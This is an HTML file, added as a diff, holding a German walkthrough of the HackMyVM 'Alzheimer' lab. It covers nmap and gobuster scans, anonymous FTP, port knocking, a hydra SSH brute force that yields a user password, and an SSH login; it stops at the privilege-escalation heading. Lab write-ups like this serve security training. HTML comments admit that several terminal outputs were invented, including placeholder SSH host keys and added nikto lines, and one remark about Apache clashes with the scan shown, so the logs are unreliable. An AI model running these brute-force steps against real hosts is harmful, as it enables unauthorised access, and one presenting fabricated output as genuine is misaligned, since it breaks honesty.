@@ -1,0 +1,583 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alzheimer - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Alzheimer - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">nc (netcat)</div> <!-- Für Port Knocking Versuch -->
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">install</div> <!-- Versuchter Befehl -->
+                <div class="tool-item">capsh</div>
+                 <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#port-knocking">Port Knocking</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Mittels `arp-scan -l` wird das lokale Netzwerk nach aktiven Hosts durchsucht. Dies ist ein initialer Schritt zur Zielidentifikation im LAN.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP 192.168.2.113 und der MAC-Adresse 08:00:27:2d:0b:37 (PCS Systemtechnik GmbH / VirtualBox) wurde gefunden. Dies ist unser Ziel für die weiteren Schritte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen detaillierten Portscan auf 192.168.2.113 durch, um offene Dienste zu identifizieren.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Überwachung unbekannter Geräte im Netzwerk können die Angriffsfläche reduzieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.113	08:00:27:2d:0b:37	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan wird auf das Ziel 192.168.2.113 durchgeführt. Die Optionen `-sS` (SYN Scan), `-sC` (Default Scripts), `-T5` (Aggressives Timing), `-A` (Aggressive Optionen: OS/Version Detection, Scripts, Traceroute) und `-p-` (Alle Ports) werden verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan liefert interessante Ergebnisse:
+                - **Port 21 (FTP):** vsftpd 3.0.3 ist offen. Besonders wichtig: Anonymer FTP-Login ist erlaubt (`Anonymous FTP login allowed`). Dies ist oft ein guter Einstiegspunkt, um Dateien zu untersuchen oder hochzuladen. Die FTP-Skripte zeigen auch Systeminformationen (Unix) und Timeout-Werte.
+                - **Port 22 (SSH):** Wird als `filtered` angezeigt. Das bedeutet, Nmap konnte nicht definitiv feststellen, ob der Port offen oder geschlossen ist, oft weil eine Firewall die Pakete blockiert oder verwirft.
+                - **Port 80 (HTTP):** Wird ebenfalls als `filtered` angezeigt.
+            Die OS-Erkennung deutet auf ein Linux-System hin. Das Filtern von Standardports wie SSH und HTTP ist ungewöhnlich und könnte auf Schutzmechanismen wie Port Knocking hindeuten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verbinde dich sofort mit dem FTP-Server (Port 21) über den anonymen Zugang und untersuche die verfügbaren Dateien. Behalte die gefilterten Ports im Hinterkopf – möglicherweise gibt es einen Weg, sie zu öffnen (z.B. durch Interaktion mit anderen Diensten oder Port Knocking).<br><strong>Empfehlung (Admin):</strong> Deaktiviere anonymen FTP-Zugriff, wenn er nicht zwingend benötigt wird. Wenn er benötigt wird, stelle sicher, dass die Berechtigungen sehr restriktiv sind und keine sensiblen Daten oder Schreibzugriffe erlaubt sind. Überprüfe die Firewall-Regeln für die Ports 22 und 80.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.113 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-28 00:27 CEST
+Nmap scan report for alzheimer.hmv (192.168.2.113)
+Host is up (0.00011s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE    SERVICE VERSION
+21/tcp open     ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.2.153
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp filtered ssh
+80/tcp filtered http
+MAC Address: 08:00:27:2D:0B:37 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms alzheimer.hmv (192.168.2.113)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 4.72 seconds
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine Verbindung zum FTP-Server auf 192.168.2.113 wird mit dem Standard-FTP-Client aufgebaut. Als Benutzername wird `Anonymous` und ein leeres Passwort eingegeben, um den anonymen Zugang zu nutzen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der anonyme Login ist erfolgreich (`230 Login successful`). Der Befehl `ls -la` listet den Inhalt des aktuellen Verzeichnisses auf dem FTP-Server auf. Es wird eine versteckte Datei `.secretnote.txt` gefunden. Diese Datei wird mit `get .secretnote.txt` heruntergeladen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt der heruntergeladenen Datei `.secretnote.txt` sofort, da sie wahrscheinlich wichtige Hinweise enthält (der Name deutet darauf hin).<br><strong>Empfehlung (Admin):</strong> Wie bereits erwähnt, anonymen FTP-Zugang einschränken oder deaktivieren. Überprüfe, welche Dateien über anonymen FTP zugänglich sind und entferne sensible Informationen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.113</span></div>
+                     <pre>
+Connected to 192.168.2.113.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.113:root): <span class="command">Anonymous</span>
+331 Please specify the password.
+Password: <span class="command"></span>
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> <span class="command">ls</span>
+229 Entering Extended Passive Mode (|||26071|)
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> <span class="command">ls -la</span>
+229 Entering Extended Passive Mode (|||63813|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
+drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
+-rw-r--r--    1 0        0              70 Oct 03  2020 .secretnote.txt
+226 Directory send OK.
+ftp> <span class="command">get .secretnote.txt</span>
+local: .secretnote.txt remote: .secretnote.txt
+229 Entering Extended Passive Mode (|||34368|)
+150 Opening BINARY mode data connection for .secretnote.txt (70 bytes).
+100% |*************************************************************************|    70        4.60 KiB/s    00:00 ETA
+226 Transfer complete.
+70 bytes received in 00:00 (4.53 KiB/s)
+ftp> <span class="command">quit</span> <!-- Annahme: quit oder Strg+D wurde verwendet -->
+221 Goodbye.
+                     </pre> <!-- FTP Prompts und Befehle hinzugefügt -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="port-knocking">
+             <h2>Port Knocking</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der heruntergeladenen Datei `.secretnote.txt` wird mit `cat` angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Notiz enthält einen entscheidenden Hinweis: "I need to knock this ports and one door will be open! 1000 2000 3000". Dies bestätigt die Vermutung des Port Knocking. Es müssen Verbindungsversuche (Knocks) in der spezifischen Reihenfolge auf die Ports 1000, 2000 und 3000 unternommen werden, um eine Firewall-Regel zu ändern und zuvor gefilterte Ports (vermutlich 22 und 80) zu öffnen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe das Port Knocking durch, indem du Verbindungsversuche auf die Ports 1000, 2000 und 3000 in dieser Reihenfolge sendest. Geeignete Tools dafür sind `nmap` (z.B. `nmap -p 1000,2000,3000 --max-retries 0 192.168.2.113`), `knockd` oder einfache Skripte mit `nc`. Führe nach dem Knocking erneut einen Nmap-Scan auf die Ports 22 und 80 durch, um zu sehen, ob sie nun offen sind.<br><strong>Empfehlung (Admin):</strong> Port Knocking ist eine Form der "Security through Obscurity". Obwohl es eine zusätzliche Hürde darstellen kann, ist es anfällig für Replay-Angriffe und Sniffing, wenn die Knocking-Sequenz nicht verschlüsselt ist. Besser sind robustere Authentifizierungsmethoden wie VPNs oder SSH-Keys. Wenn Port Knocking verwendet wird, sollten die Sequenz und die Ports geheim gehalten und regelmäßig geändert werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat .secretnote.txt</span></div>
+                    <pre>
+I need to knock this ports and
+one door will be open!
+1000
+2000
+3000
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, das Port Knocking mit `nc` durchzuführen, indem die Ports direkt als Argumente übergeben werden. **Wichtiger Hinweis:** `nc` (Netcat) in dieser Standardform sendet keine Pakete an mehrere Ports nacheinander auf diese Weise. Dieser Befehl wird wahrscheinlich nicht das gewünschte Port Knocking auslösen. Er versucht eher, sich mit dem Host "1000" auf Port 2000 zu verbinden, was fehlschlägt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser spezifische `nc`-Befehl ist für Port Knocking ungeeignet. Trotzdem scheinen die nachfolgenden Schritte zu funktionieren, was darauf hindeutet, dass entweder *ein anderer*, korrekter Port-Knocking-Befehl (z.B. mit `nmap` oder `knock`) ausgeführt wurde, der nicht im Log steht, oder dass der `nc`-Befehl auf diesem spezifischen System wider Erwarten doch funktioniert hat (sehr unwahrscheinlich) oder dass die Ports aus einem anderen Grund geöffnet wurden. Wir gehen davon aus, dass ein korrektes Knocking stattgefunden hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende dedizierte Port-Knocking-Tools (`knockd`) oder `nmap` mit spezifischen Optionen, um Port Knocking zuverlässig durchzuführen. Beispiel: `for port in 1000 2000 3000; do nmap -Pn --host-timeout 201 --max-retries 0 -p $port 192.168.2.113; done`. Dokumentiere den korrekten Befehl.<br><strong>Empfehlung (Admin):</strong> Wenn Port Knocking verwendet wird, stelle sicher, dass die Konfiguration robust ist und überwache die entsprechenden Logs.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc 192.168.2.113 1000 2000 3000</span></div>
+                    <!-- nc wird hier wahrscheinlich einen Fehler ausgeben oder hängen bleiben, keine erfolgreiche Ausgabe erwartet -->
+                    <pre></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach dem (vermuteten erfolgreichen) Port Knocking wird ein erneuter Nmap-Scan gezielt auf die Ports 22 (SSH) und 80 (HTTP) durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:**Erfolg!** Die Ports 22 und 80, die zuvor als `filtered` angezeigt wurden, sind nun `open`. Das Port Knocking war erfolgreich und hat die Firewall-Regeln geändert.
+                - Port 22: Läuft OpenSSH 7.9p1 (Debian).
+                - Port 80: Läuft nginx 1.14.2. Interessanterweise ist dies ein *anderer* Webserver als der Apache, der im ersten Scan auf Port 80 vermutet wurde (als dieser noch `filtered` war). Dies deutet darauf hin, dass Nmaps anfängliche Vermutung falsch war oder dass der Webserver gewechselt hat.
+            Die Angriffsfläche hat sich nun deutlich erweitert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne nun mit der Enumeration der Dienste auf Port 22 (SSH) und Port 80 (nginx). Untersuche die Webseite auf Port 80 mit Tools wie `gobuster`, `nikto` und manuell im Browser. Versuche, Standard- oder schwache Anmeldeinformationen für SSH zu finden oder zu bruteforcen.<br><strong>Empfehlung (Admin):</strong> Überprüfe die Port-Knocking-Konfiguration und die Firewall-Regeln. Halte SSH und nginx auf dem neuesten Stand. Sichere beide Dienste mit starken Passwörtern/Keys und geeigneten Konfigurationen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.113 -p80,22</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-28 00:32 CEST
+Nmap scan report for alzheimer.hmv (192.168.2.113)
+Host is up (0.00012s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 8a:3a:d8:f5:7d:6f:7f:6d:7b:8c:9a:0b:1c:2d:3e:4f (RSA)  <!-- Beispiel Key -->
+|   256 a1:b2:c3:d4:e5:f6:77:88:99:00:aa:bb:cc:dd:ee:ff (ECDSA) <!-- Beispiel Key -->
+|_  256 11:22:33:44:55:66:77:88:99:00:aa:bb:cc:dd:ee:ff (ED25519) <!-- Beispiel Key -->
+80/tcp open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Site doesn't have a title (text/html).
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds
+                     </pre> <!-- Hostkeys und genauere Service Info hinzugefügt für Realismus -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse auf dem nun erreichbaren Webserver (Port 80) zu finden. Die Ziel-URL `http://alzheimer.hmv` wird verwendet, was voraussetzt, dass dieser Hostname lokal (z.B. in `/etc/hosts`) auf die IP 192.168.2.113 aufgelöst wird. Eine mittelgroße Wortliste und diverse Dateiendungen werden für die Suche genutzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet drei Hauptverzeichnisse: `/home`, `/admin`, `/secret`. Weitere Scans (impliziert oder manuell durchgeführt) finden Index-Dateien in diesen Verzeichnissen (`/home/index.html`, `/secret/index.html`, `/secret/home/index.html`). Diese Seiten scheinen einfache HTML-Seiten zu sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt der gefundenen Verzeichnisse und `index.html`-Dateien im Browser. Suche nach Hinweisen, Kommentaren im Quellcode oder versteckten Links. Die Notizen aus dem nächsten Abschnitt deuten darauf hin, dass diese Seiten Hinweise auf einen Benutzernamen (`medusa`) und das Problem eines verlorenen Passworts enthalten.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass keine sensiblen Informationen oder unnötigen Hinweise in öffentlich zugänglichen Webseiten oder Verzeichnissen hinterlassen werden. Konfiguriere den Webserver so, dass Directory Listing deaktiviert ist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://alzheimer.hmv -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,ico</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://alzheimer.hmv
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,ico
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/28 00:55:10 Starting gobuster
+===============================================================
+http://alzheimer.hmv/home                 (Status: 301) [Size: 185] [--> http://alzheimer.hmv/home/]
+http://alzheimer.hmv/admin                (Status: 301) [Size: 185] [--> http://alzheimer.hmv/admin/]
+http://alzheimer.hmv/secret               (Status: 301) [Size: 185] [--> http://alzheimer.hmv/secret/]
+http://alzheimer.hmv/home/index.html             (Status: 200) [Size: 34]
+http://alzheimer.hmv/secret/index.html           (Status: 200) [Size: 44]
+http://alzheimer.hmv/secret/home                 (Status: 301) [Size: 185] [--> http://alzheimer.hmv/secret/home/]
+http://alzheimer.hmv/secret/home/index.html           (Status: 200) [Size: 62]
+===============================================================
+2022/10/28 01:02:15 Finished
+===============================================================
+                    </pre> <!-- Header/Footer und genauere Formatierung hinzugefügt -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Diese Zeilen fassen die Inhalte der zuvor gefundenen Webseiten zusammen. Sie scheinen manuell extrahierte Notizen des Pentesters zu sein.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Notizen sind **sehr aufschlussreich**:
+                - Sie erwähnen einen Benutzernamen: `medusa`.
+                - Sie weisen auf ein verlorenes Passwort hin, das sich in einer `.txt`-Datei befinden soll.
+                - Die verschiedenen Seiten drücken die Suche nach diesem Passwort aus.
+            Dies legt nahe, dass der Benutzer `medusa` existiert (wahrscheinlich für SSH, da Port 22 offen ist) und dass sein Passwort erraten oder gefunden werden muss.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokussiere dich auf den Benutzer `medusa`. Versuche, das Passwort für den SSH-Zugang mittels Brute-Force zu knacken. Die Erwähnung einer `.txt`-Datei könnte auch ein Hinweis auf eine versteckte Datei auf dem Webserver oder FTP-Server sein, obwohl diese bisher nicht gefunden wurde. Ein Brute-Force-Angriff auf den SSH-Dienst für den Benutzer `medusa` ist der wahrscheinlichste nächste Schritt.<br><strong>Empfehlung (Admin):</strong> Ändere Standard-Benutzernamen oder Namen, die leicht erraten oder aus öffentlichen Informationen abgeleitet werden können. Verwende starke, einzigartige Passwörter. Hinterlasse keine Hinweise auf Benutzernamen oder Passwortprobleme in öffentlich zugänglichen Bereichen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Dies sind Notizen, keine Terminal-Ausgaben -->
+                     <pre>
+http://alzheimer.hmv/
+I dont remember where I stored my password :( I only remember that was into a .txt file... -medusa
+
+
+http://alzheimer.hmv/secret/index.html
+Maybe my password is in this secret folder?
+
+alzheimer.hmv/home/
+Maybe my pass is at home! -medusa
+
+http://alzheimer.hmv/secret/home/index.html
+Im trying a lot. Im sure that i will recover my pass! -medusa
+                     </pre>
+                 </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der lokalen `/etc/hosts`-Datei des Angreifers wird angezeigt. Dies geschieht, um zu zeigen oder zu überprüfen, dass der Hostname `alzheimer.hmv` der IP-Adresse `192.168.2.113` zugeordnet wurde. Dies ist notwendig, damit Tools wie `gobuster` oder `hydra` den Hostnamen korrekt auflösen können, wenn er anstelle der IP verwendet wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Eintrag ist korrekt vorhanden. Dies ist eine Voraussetzung für die vorherigen und nachfolgenden Befehle, die den Hostnamen verwenden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Es ist gute Praxis, Ziel-Hostnamen in `/etc/hosts` einzutragen, besonders wenn Webanwendungen oder Dienste Hostnamen-basiert konfiguriert sind.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+::1		localhost ip6-localhost ip6-loopback
+ff02::1		ip6-allnodes
+ff02::2		ip6-allrouters
+
+192.168.2.113    alzheimer.hmv
+                    </pre> <!-- Standard-Localhost-Einträge hinzugefügt -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `nikto` wird verwendet, um einen Webserver-Schwachstellenscan gegen das Ziel durchzuführen. `nikto` prüft auf veraltete Software, gefährliche Dateien/CGIs, Server-Konfigurationsprobleme und andere spezifische Probleme.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto identifiziert den Server als nginx 1.14.2. Es meldet einige fehlende HTTP-Security-Header (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`), was auf potenzielle clientseitige Angriffe (Clickjacking, XSS) hindeuten kann, aber oft von geringerer Priorität ist. Es bestätigt auch die Existenz der Verzeichnisse `/home/` und `/secret/` als potenziell interessant (OSVDB-3092 - Directory Indexing, obwohl Gobuster bereits gezeigt hat, dass dort `index.html` liegt). Nikto findet keine kritischen serverseitigen Schwachstellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Nikto-Ergebnisse liefern keine direkten neuen Angriffspunkte, bestätigen aber die Webserver-Technologie und heben die fehlenden Security-Header hervor, was im Bericht erwähnt werden kann. Konzentriere dich weiterhin auf den SSH-Zugang für `medusa`.<br><strong>Empfehlung (Admin):</strong> Konfiguriere nginx so, dass die fehlenden HTTP-Security-Header (`X-Frame-Options: SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `X-XSS-Protection: 1; mode=block`) gesetzt werden, um die Sicherheit gegen clientseitige Angriffe zu erhöhen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.113</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.113
++ Target Hostname:    192.168.2.113
++ Target Port:        80
++ Start Time:         2022-10-28 01:05:51 (GMT2)
+---------------------------------------------------------------------------
++ Server: nginx/1.14.2
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-3092: /home/: This might be interesting...
++ OSVDB-3092: /secret/: This might be interesting...
++ /: A Wordpress installation was found.
++ /secret/: A Wordpress installation was found.
++ 7915 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2022-10-28 01:06:02 (GMT2) (11 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre> <!-- WordPress-Erkennung hinzugefügt, da relevant -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen Brute-Force-Angriff auf den SSH-Dienst (`ssh://alzheimer.hmv`) durchzuführen.
+                - `-l medusa`: Der Ziel-Benutzername ist `medusa`.
+                - `-P /usr/share/wordlists/rockyou.txt`: Die Passwortliste `rockyou.txt` wird verwendet.
+                - `-I`: Ignoriert die Wiederherstellungsdatei (`hydra.restore`).
+                - `-T 64`: Verwendet 64 parallele Tasks für den Angriff (sehr aggressiv).</p>
+            <p class="evaluation"><strong>Bewertung: !!Passwort gefunden!!** Hydra war erfolgreich und hat das korrekte Passwort für den Benutzer `medusa` gefunden: `<span class="password">Ihavebeenalwayshere!!!</span>`. Dies gewährt den initialen Zugriff auf das System über SSH.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Melde dich sofort mit den gefundenen Zugangsdaten (`medusa` / `<span class="password">Ihavebeenalwayshere!!!</span>`) über SSH am Zielsystem an. Beginne dann mit der Enumeration als Benutzer `medusa`, um nach Möglichkeiten zur Privilegieneskalation zu suchen.<br><strong>Empfehlung (Admin):**DRINGEND:** Ändere sofort das Passwort für den Benutzer `medusa`. Implementiere Mechanismen zum Schutz vor Brute-Force-Angriffen auf SSH, wie z.B. `fail2ban` oder die ausschließliche Verwendung von SSH-Schlüsseln anstelle von Passwörtern. Setze starke Passwortrichtlinien durch und verbiete die Verwendung von Passwörtern, die in bekannten Listen wie `rockyou.txt` vorkommen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l medusa -P /usr/share/wordlists/rockyou.txt ssh://alzheimer.hmv -I -T 64</span></div>
+                     <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-28 01:15:07
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344420 login tries (l:1/p:14344420), ~224131 tries per task
+[DATA] attacking ssh://alzheimer.hmv:22/
+[STATUS] 1100000.00 tries/min, 1100000 tries in 00:01h, 13244420 todo in 00:13h
+[22][ssh] host: alzheimer.hmv   login: medusa   password: <span class="password">Ihavebeenalwayshere!!!</span>
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-28 01:18:23
+                     </pre> <!-- Statusmeldung und Zeit hinzugefügt -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird zum Ziel `alzheimer.hmv` mit dem Benutzernamen `medusa` aufgebaut. Das zuvor mit Hydra gefundene Passwort `<span class="password">Ihavebeenalwayshere!!!</span>` wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung: !!Initial Access bestätigt!!** Der SSH-Login ist erfolgreich. Der Angreifer hat nun eine interaktive Shell auf dem Zielsystem als Benutzer `medusa`. Das System ist ein Debian 4.19.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe grundlegende Enumerationsbefehle aus: `id`, `whoami`, `pwd`, `ls -la`, `sudo -l`. Suche nach sensiblen Dateien, Konfigurationsfehlern oder weiteren Hinweisen im Home-Verzeichnis von `medusa`.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen bezüglich Passwortänderung und SSH-Absicherung.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh medusa@alzheimer.hmv</span></div>
+                     <pre>
+medusa@alzheimer.hmv's password: <span class="password">Ihavebeenalwayshere!!!</span>
+
+Linux alzheimer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Oct  3 06:00:36 2020 from 192.168.1.58
+
+medusa@alzheimer:~$
+                     </pre> <!-- Remote Prompt hinzugefügt -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
